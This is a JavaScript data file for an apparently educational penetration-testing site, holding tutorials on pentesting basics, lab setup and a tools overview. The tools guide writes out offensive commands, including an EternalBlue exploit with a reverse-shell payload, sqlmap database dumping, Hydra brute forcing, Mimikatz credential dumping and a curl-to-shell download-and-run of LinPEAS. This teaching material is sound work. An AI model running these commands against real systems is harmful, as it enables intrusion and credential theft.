export const guidesCategories = [
  {
    id: 'getting-started',
    name: 'Getting Started',
    description: 'Introduction to cybersecurity and pentesting basics',
    icon: 'Shield',
    color: 'from-blue-500 to-blue-600'
  },
  {
    id: 'technical-guides',
    name: 'Technical Guides',
    description: 'In-depth tutorials and methodologies',
    icon: 'Book',
    color: 'from-purple-500 to-purple-600'
  },
  {
    id: 'advanced-topics',
    name: 'Advanced Topics',
    description: 'Expert-level techniques and strategies',
    icon: 'Target',
    color: 'from-red-500 to-red-600'
  },
  {
    id: 'tool-tutorials',
    name: 'Tool Tutorials',
    description: 'Master essential security tools',
    icon: 'Wrench',
    color: 'from-green-500 to-green-600'
  }
];

export const guides = [
  // ============ GETTING STARTED ============
  {
    id: 'what-is-penetration-testing',
    slug: 'what-is-penetration-testing',
    category: 'getting-started',
    title: 'What is Penetration Testing?',
    description: 'Learn the fundamentals of penetration testing, its methodologies, and why it\'s crucial for modern cybersecurity.',
    duration: 5,
    level: 'Beginner',
    content: `
# What is Penetration Testing?

Penetration testing, often called "pen testing" or "ethical hacking," is a simulated cyber attack against your computer system to check for exploitable vulnerabilities.

## Why Penetration Testing Matters

In today's digital landscape, organizations face constant threats from malicious actors. Penetration testing helps:

- **Identify Security Weaknesses**: Discover vulnerabilities before attackers do
- **Validate Security Controls**: Ensure your defenses work as intended
- **Meet Compliance Requirements**: Satisfy regulatory standards (PCI DSS, HIPAA, etc.)
- **Reduce Financial Risk**: Prevent costly data breaches

## Types of Penetration Testing

### 1. Network Penetration Testing
Tests the security of network infrastructure, including firewalls, routers, and switches.

### 2. Web Application Testing
Focuses on web-based applications, APIs, and web services to find vulnerabilities like SQL injection, XSS, and CSRF.

### 3. Social Engineering
Tests human vulnerabilities through phishing, pretexting, and physical security breaches.

### 4. Wireless Testing
Evaluates the security of wireless networks and protocols (Wi-Fi, Bluetooth).

## The Penetration Testing Methodology

\`\`\`
1. Planning & Reconnaissance
   ↓
2. Scanning & Enumeration
   ↓
3. Gaining Access (Exploitation)
   ↓
4. Maintaining Access
   ↓
5. Analysis & Reporting
\`\`\`

## Legal and Ethical Considerations

⚠️ **Important**: Always obtain written authorization before conducting any penetration test. Unauthorized testing is illegal and can result in severe penalties.

### Key Principles:
- Get explicit permission in writing
- Define scope clearly
- Respect data privacy
- Report findings responsibly

## Career Paths in Penetration Testing

- **Junior Penetration Tester**: Entry-level position, basic testing
- **Penetration Tester**: Intermediate skills, independent testing
- **Senior Penetration Tester**: Advanced techniques, team leadership
- **Red Team Leader**: Complex attack simulations

## Next Steps

Ready to start your journey? Check out our guide on [Setting Up Your Security Lab](#) to create your practice environment.
    `,
    tags: ['penetration testing', 'cybersecurity', 'ethical hacking', 'introduction'],
    author: 'AuditSec Team',
    publishedDate: '2024-01-15',
    readTime: 5
  },
  {
    id: 'setting-up-security-lab',
    slug: 'setting-up-security-lab',
    category: 'getting-started',
    title: 'Setting Up Your Security Lab',
    description: 'Step-by-step guide to building a secure practice environment for penetration testing and cybersecurity training.',
    duration: 15,
    level: 'Beginner',
    content: `
# Setting Up Your Security Lab

Creating a safe, isolated environment is essential for learning penetration testing without risking legal issues or damaging production systems.

## Hardware Requirements

### Minimum Specifications
- **CPU**: Dual-core processor (Intel i5 or equivalent)
- **RAM**: 8GB (16GB recommended)
- **Storage**: 100GB free space (SSD preferred)
- **Network**: Internet connection for downloading tools

### Recommended Setup
- **CPU**: Quad-core or higher
- **RAM**: 16GB or more
- **Storage**: 250GB+ SSD
- **GPU**: Not required but helpful for password cracking

## Virtualization Software

Choose one of these hypervisors:

### 1. VMware Workstation Player (Free for personal use)
- **Pros**: Excellent performance, user-friendly
- **Cons**: Limited features in free version
- **Best for**: Windows users

### 2. VirtualBox (Free & Open Source)
- **Pros**: Cross-platform, completely free
- **Cons**: Slightly lower performance
- **Best for**: Budget-conscious learners

### 3. VMware Workstation Pro
- **Pros**: Advanced features, snapshots, cloning
- **Cons**: Paid license required
- **Best for**: Professional environments

## Essential Virtual Machines

### Attacker Machine: Kali Linux

\`\`\`bash
# Download Kali Linux
# Visit: https://www.kali.org/downloads/

# Recommended Version: Kali Linux 64-bit (VM)
# Size: ~3.5GB
\`\`\`

**Kali Linux Configuration:**
- Allocate 4GB RAM (minimum 2GB)
- 2 CPU cores
- 80GB dynamic disk
- NAT or Bridged network adapter

### Target Machines

#### Metasploitable 2 (Linux)
- Intentionally vulnerable Linux system
- Perfect for beginners
- Pre-configured with multiple vulnerabilities

#### DVWA (Damn Vulnerable Web Application)
- Web application testing practice
- Multiple difficulty levels
- Runs on Apache/MySQL

#### Windows 10 VM (Optional)
- For Windows-specific testing
- Requires valid license
- Useful for Active Directory practice

## Network Configuration

### Network Modes Explained

**1. NAT (Network Address Translation)**
- VMs can access internet
- VMs cannot access host directly
- ✅ **Recommended for beginners**

**2. Bridged**
- VMs appear as separate devices on network
- Can access other network devices
- ⚠️ Use with caution on shared networks

**3. Host-Only**
- VMs communicate only with host
- No internet access
- ✅ **Most secure for isolated testing**

### Creating an Isolated Lab Network

\`\`\`
Configuration:
├── VMware/VirtualBox: Host-Only Network
├── Subnet: 192.168.56.0/24
├── Kali Linux: 192.168.56.10
├── Metasploitable: 192.168.56.100
└── DVWA: 192.168.56.101
\`\`\`

## Security Best Practices

### ⚠️ Critical Rules

1. **Never use your lab VMs for regular browsing**
2. **Keep lab isolated from production networks**
3. **Take snapshots before major changes**
4. **Disable internet on vulnerable VMs when not needed**
5. **Use strong passwords on attacker machines**

### Snapshot Strategy

\`\`\`
Kali Linux Snapshots:
├── 01_Fresh_Install
├── 02_Tools_Configured
└── 03_Before_Major_Test

Metasploitable Snapshots:
├── 01_Clean_State
└── 02_After_Compromise (for practice)
\`\`\`

## Initial Setup Checklist

- [ ] Install virtualization software
- [ ] Download Kali Linux VM
- [ ] Download vulnerable VMs (Metasploitable, DVWA)
- [ ] Configure host-only network
- [ ] Assign static IPs to all VMs
- [ ] Test connectivity between VMs
- [ ] Create snapshots of clean installations
- [ ] Update Kali Linux: \`sudo apt update && sudo apt upgrade\`
- [ ] Test basic tools (nmap, burpsuite)
- [ ] Document your lab configuration

## Troubleshooting Common Issues

### VM Won't Boot
- Check virtualization is enabled in BIOS
- Verify sufficient RAM allocation
- Ensure .iso file isn't corrupted

### Network Not Working
- Check network adapter settings
- Verify DHCP is enabled (or static IP configured)
- Test with \`ping\` command

### Performance Issues
- Reduce RAM allocation to other VMs
- Close unnecessary applications on host
- Enable hardware virtualization (VT-x/AMD-V)

## Next Steps

Once your lab is ready, proceed to our [Essential Tools Overview](#) guide to learn about the most important penetration testing tools.

## Resources

- Kali Linux Documentation: https://www.kali.org/docs/
- Metasploitable Download: https://sourceforge.net/projects/metasploitable/
- DVWA GitHub: https://github.com/digininja/DVWA
    `,
    tags: ['lab setup', 'virtualization', 'kali linux', 'practice environment'],
    author: 'AuditSec Team',
    publishedDate: '2024-01-18',
    readTime: 15
  },
  {
    id: 'essential-tools-overview',
    slug: 'essential-tools-overview',
    category: 'getting-started',
    title: 'Essential Tools Overview',
    description: 'Comprehensive overview of the must-know tools for penetration testing, from reconnaissance to exploitation.',
    duration: 10,
    level: 'Beginner',
    content: `
# Essential Penetration Testing Tools

Every penetration tester needs a solid toolkit. This guide covers the essential tools you'll use daily.

## Reconnaissance Tools

### 1. Nmap - Network Mapper

The industry standard for network discovery and security auditing.

\`\`\`bash
# Basic port scan
nmap 192.168.1.1

# Aggressive scan with OS detection
nmap -A -T4 192.168.1.1

# Scan all ports
nmap -p- 192.168.1.1

# Service version detection
nmap -sV 192.168.1.1
\`\`\`

**Use Cases:**
- Discovering live hosts
- Port scanning
- Service identification
- OS fingerprinting

### 2. Netcat - The Swiss Army Knife

Versatile networking tool for reading and writing network connections.

\`\`\`bash
# Banner grabbing
nc -v target.com 80

# Listening on port (reverse shell)
nc -lvp 4444

# File transfer
nc -l -p 1234 > received_file.txt
\`\`\`

### 3. Wireshark - Network Protocol Analyzer

Capture and analyze network traffic in real-time.

**Key Features:**
- Packet capture and analysis
- Protocol decoding
- Filter expressions
- Follow TCP streams

## Web Application Testing Tools

### 4. Burp Suite - Web Security Testing

The most popular tool for web application security testing.

**Key Features:**
- **Proxy**: Intercept and modify HTTP/HTTPS requests
- **Scanner**: Automated vulnerability scanning (Pro version)
- **Intruder**: Automated attacks and fuzzing
- **Repeater**: Manual request manipulation
- **Decoder**: Encode/decode data

\`\`\`
Common Burp Suite Workflow:
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Browse target application
3. Intercept requests in Proxy tab
4. Send interesting requests to Repeater
5. Modify and resend for testing
6. Use Intruder for payload attacks
\`\`\`

### 5. OWASP ZAP - Zed Attack Proxy

Free, open-source alternative to Burp Suite.

\`\`\`bash
# Launch ZAP
zap.sh

# Automated scan
zap-cli quick-scan http://target.com
\`\`\`

### 6. Nikto - Web Server Scanner

Automated scanner for web server vulnerabilities.

\`\`\`bash
# Basic scan
nikto -h http://target.com

# Scan with specific port
nikto -h target.com -p 8080

# Save results
nikto -h target.com -o results.html -Format html
\`\`\`

## Exploitation Tools

### 7. Metasploit Framework

The world's most used penetration testing framework.

\`\`\`bash
# Start Metasploit console
msfconsole

# Search for exploits
search ms17-010

# Use an exploit
use exploit/windows/smb/ms17_010_eternalblue

# Set target and payload
set RHOST 192.168.1.100
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.10

# Launch exploit
exploit
\`\`\`

**Key Modules:**
- **Exploits**: Attack code for vulnerabilities
- **Payloads**: Code to run after exploitation
- **Auxiliary**: Scanning and fuzzing modules
- **Post**: Post-exploitation modules

### 8. SQLMap - SQL Injection Tool

Automated SQL injection and database takeover tool.

\`\`\`bash
# Basic injection test
sqlmap -u "http://target.com/page.php?id=1"

# Dump database
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Get tables from database
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables

# Dump specific table
sqlmap -u "http://target.com/page.php?id=1" -D db -T users --dump
\`\`\`

## Password Cracking Tools

### 9. John the Ripper

Fast password cracker supporting numerous formats.

\`\`\`bash
# Crack password hashes
john hashes.txt

# Use wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Show cracked passwords
john --show hashes.txt
\`\`\`

### 10. Hydra - Network Login Cracker

Brute force tool for network protocols.

\`\`\`bash
# SSH brute force
hydra -l admin -P passwords.txt ssh://192.168.1.100

# HTTP POST form attack
hydra -l admin -P passwords.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# FTP brute force
hydra -l admin -P passwords.txt ftp://192.168.1.100
\`\`\`

## Enumeration Tools

### 11. Enum4linux

Windows and Samba enumeration tool.

\`\`\`bash
# Full enumeration
enum4linux -a 192.168.1.100

# User enumeration
enum4linux -U 192.168.1.100
\`\`\`

### 12. Gobuster - Directory Brute Forcing

Fast directory/file enumeration tool.

\`\`\`bash
# Directory brute force
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# DNS subdomain enumeration
gobuster dns -d target.com -w subdomains.txt
\`\`\`

## Post-Exploitation Tools

### 13. Mimikatz

Extract credentials from Windows systems.

\`\`\`
# Dump credentials
sekurlsa::logonpasswords

# Extract Kerberos tickets
sekurlsa::tickets
\`\`\`

### 14. LinPEAS / WinPEAS

Privilege escalation enumeration scripts.

\`\`\`bash
# Download and run LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
\`\`\`

## Tool Organization Best Practices

### Kali Linux Tool Categories

\`\`\`
/usr/share/wordlists/     # Password lists
/usr/share/nmap/          # Nmap scripts
/opt/                     # Custom tools
~/tools/                  # Your custom scripts
\`\`\`

### Recommended Tool Learning Order

1. **Week 1**: Nmap, Netcat, Wireshark (Reconnaissance)
2. **Week 2**: Burp Suite, OWASP ZAP (Web Testing)
3. **Week 3**: Metasploit, SQLMap (Exploitation)
4. **Week 4**: John, Hydra (Password Attacks)

## Tool Cheat Sheet Quick Reference

\`\`\`bash
# Nmap - Quick scan
nmap -sV -sC -oA scan_results target.com

# Burp Suite - Start
burpsuite &

# Metasploit - Quick search
msfconsole -q -x "search cve:2021; exit"

# SQLMap - Fast test
sqlmap -u "http://target/?id=1" --batch --dbs

# Gobuster - Common dirs
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -t 50

# Hydra - SSH attack
hydra -L users.txt -P passwords.txt ssh://target.com
\`\`\`

## Legal and Ethical Reminders

⚠️ **Critical**: These tools are for authorized testing only. Unauthorized use is illegal.

- Always get written permission
- Respect scope limitations
- Follow responsible disclosure
- Never test production systems without approval

## Next Steps

Now that you know the essential tools, explore our [Web Application Security Testing](#) guide to put them into practice.

## Additional Resources

- Kali Tools Documentation: https://www.kali.org/tools/
- Metasploit Unleashed: https://www.offensive-security.com/metasploit-unleashed/
- Burp Suite Academy: https://portswigger.net/web-security
    `,
    tags: ['tools', 'nmap', 'burp suite', 'metasploit', 'penetration testing'],
    author: 'AuditSec Team',
    publishedDate: '2024-01-20',
    readTime: 10
  },

  // ============ TECHNICAL GUIDES (Exemples) ============
  {
    id: 'web-app-security-testing',
    slug: 'web-app-security-testing',
    category: 'technical-guides',
    title: 'Web Application Security Testing',
    description: 'Learn to identify and exploit common web vulnerabilities including OWASP Top 10.',
    duration: 30,
    level: 'Intermediate',
    content: `
# Web Application Security Testing

(Contenu à développer - placeholder pour démonstration)
    `,
    tags: ['web security', 'OWASP', 'vulnerabilities'],
    author: 'AuditSec Team',
    publishedDate: '2024-01-25',
    readTime: 30
  },
  {
    id: 'network-scanning-techniques',
    slug: 'network-scanning-techniques',
    category: 'technical-guides',
    title: 'Network Scanning Techniques',
    description: 'Master advanced network reconnaissance and enumeration strategies.',
    duration: 25,
    level: 'Intermediate',
    content: `
# Network Scanning Techniques

(Contenu à développer - placeholder pour démonstration)
    `,
    tags: ['network security', 'scanning', 'reconnaissance'],
    author: 'AuditSec Team',
    publishedDate: '2024-01-28',
    readTime: 25
  },
  {
    id: 'osint-investigation-methods',
    slug: 'osint-investigation-methods',
    category: 'technical-guides',
    title: 'OSINT Investigation Methods',
    description: 'Gather intelligence using open-source intelligence techniques.',
    duration: 20,
    level: 'Advanced',
    content: `
# OSINT Investigation Methods

(Contenu à développer - placeholder pour démonstration)
    `,
    tags: ['OSINT', 'intelligence', 'reconnaissance'],
    author: 'AuditSec Team',
    publishedDate: '2024-02-01',
    readTime: 20
  }
];

// Fonction helper pour obtenir les guides par catégorie
export const getGuidesByCategory = (categoryId) => {
  return guides.filter(guide => guide.category === categoryId);
};

// Fonction helper pour obtenir un guide par slug
export const getGuideBySlug = (slug) => {
  return guides.find(guide => guide.slug === slug);
};

// Fonction helper pour obtenir la catégorie d'un guide
export const getCategoryById = (categoryId) => {
  return guidesCategories.find(cat => cat.id === categoryId);
};
